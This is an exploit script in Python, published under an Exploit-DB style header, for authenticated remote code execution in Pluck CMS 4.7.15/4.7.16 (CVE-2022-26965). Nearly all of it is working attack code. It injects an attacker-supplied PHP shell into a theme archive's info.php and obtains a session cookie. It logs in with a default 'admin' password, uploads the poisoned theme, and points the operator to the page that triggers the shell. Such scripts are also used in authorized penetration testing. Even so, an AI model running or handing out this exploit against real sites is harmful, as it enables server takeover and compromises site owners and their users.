# Exploit Title: Pluck CMS 4.7.16 - Remote Code Execution (RCE) (Authenticated)
# Date: 18.07.2023
# Exploit Author: Ashish Koli (Shikari)
#           Author: Jack Potter
# Vendor Homepage: https://github.com/pluck-cms/pluck
# Version: 4.7.15/4.7.16
# Tested on Windows 10
# CVE: CVE-2022-26965

# Reference: https://github.com/shikari00007/Pluck-CMS-Pluck-4.7.16-Theme-Upload-Remote-Code-Execution-Authenticated--POC

'''
Description:
A theme upload functinality in Pluck CMS before 4.7.16 allows an admin
privileged user to gain access in the host through the "themes files",
which may result in remote code execution. This rendition of the original exploit
includes patches for problems I had when executing the script and automatic theme
shell injection
'''

import sys
import requests
import json
import time
import urllib.parse
import struct
import shutil
import tarfile
import os.path
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-t","--target",required=True)
parser.add_argument("-p","--port",default="80")
parser.add_argument("-P", "--password", default="admin")
parser.add_argument("-u", "--url", default="/pluck-4.7.15", help="Base of pluck url")
parser.add_argument("-T","--theme",required=True,help="Path to theme (.tar.gz) to inject into")
parser.add_argument("-s","--shell",required=True,help="Path to shell.php script")
args = parser.parse_args()

def injectTheme():
    # Get path to Theme and filename
    path = "/".join(args.theme.split("/")[:-1])
    themeName = args.theme.split("/")[-1].split(".")[0]

    # Read shell code into "shell" variable
    with open(args.shell, "r") as sp:
        shell = sp.read()
        if len(shell) < 1 or shell == "":
            print("[!] Invalid shell path.")
            exit()

    # Unpack initial theme.tar.gz
    shutil.unpack_archive(args.theme,path)
    # Append shell to "info.php" from unpacked theme
    with open(path+"/"+themeName+"/info.php","a") as info:
        info.write(shell)
    # Repack theme with appended data
    with tarfile.open(path+"/"+themeName+"1.tar.gz", "w:gz") as tar:
        tar.add(path, arcname=os.path.sep)
    # Return path to new theme
    return path+"/"+themeName+"1.tar.gz"


def getCookie():
    session = requests.Session()
    link = 'http://' + args.target + ':' + args.port + args.url
    response = session.get(link)
    cookies_session = session.cookies.get_dict()
    cookie = json.dumps(cookies_session)
    cookie = cookie.replace('"}','')
    cookie = cookie.replace('{"', '')
    cookie = cookie.replace('"', '')
    cookie = cookie.replace(" ", '')
    cookie = cookie.replace(":", '=')
    return cookie

def authenticate(cookie):
    # Compute Content-Length:
    base_content_len = 27
    password_encoded = urllib.parse.quote(args.password, safe='')
    password_encoded_len = len(password_encoded.encode('utf-8'))
    content_len = base_content_len + password_encoded_len

    # Construct Header:
    header = {
        'Host': args.target,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': str(content_len),
        'Origin': 'http://' + args.target,
        'Connection': 'close',
        'Referer': 'http://' + args.target + args.url + '/login.php',
        'Cookie': cookie,
        'Upgrade-Insecure-Requests': '1'
    }

    # Construct Data:
    body = {
        'cont1': args.password,
        'bogus': '',
        'submit': 'Log in',
    }

    # Authenticating:
    link_auth = 'http://' + args.target + ':' + args.port + args.url + '/login.php'
    auth = requests.post(link_auth, headers=header, data=body)
    if 'error' in auth.text:
        print('[!!!] Password incorrect, please try again')
        exit()
    else:
        print('[+++] Authentification was succesfull')

def uploadShell(cookie, injectedTheme):
    # Construct Header:
    header1 = {
        'Host': args.target,
        'Origin': 'http://' + args.target,
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'http://' + args.target + args.url + '/admin.php?action=themeinstall',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en;q=0.5',
        'Cookie': cookie,
        'Connection': 'close',
    }

    files = {"sendfile": open(injectedTheme, 'rb')}
    data = {"submit":"Upload"}
    link_upload = 'http://' + args.target + ':' + args.port + args.url + '/admin.php?action=themeinstall'
    upload = requests.post(link_upload, headers=header1, files=files, data=data)

def main():
    print("\n[...] Injecting \""+os.path.split(args.shell)[1]+"\" into \""+os.path.split(args.theme)[1]+"\"")
    theme = injectTheme()
    print("[+++] Script was succesfully injected!")
    print("[...] Generating cookie")
    cookie = getCookie()
    print("[...] Authenticating user")
    authenticate(cookie)
    print("[...] Uploading malicious theme")
    uploadShell(cookie, theme)
    print("[+] Stage complete!")
    print("[!] Please navigate to http://" + args.target + ":" + args.port + args.url + "/admin.php?action=themeuninstall in your browser")

if __name__ == "__main__":
    main()
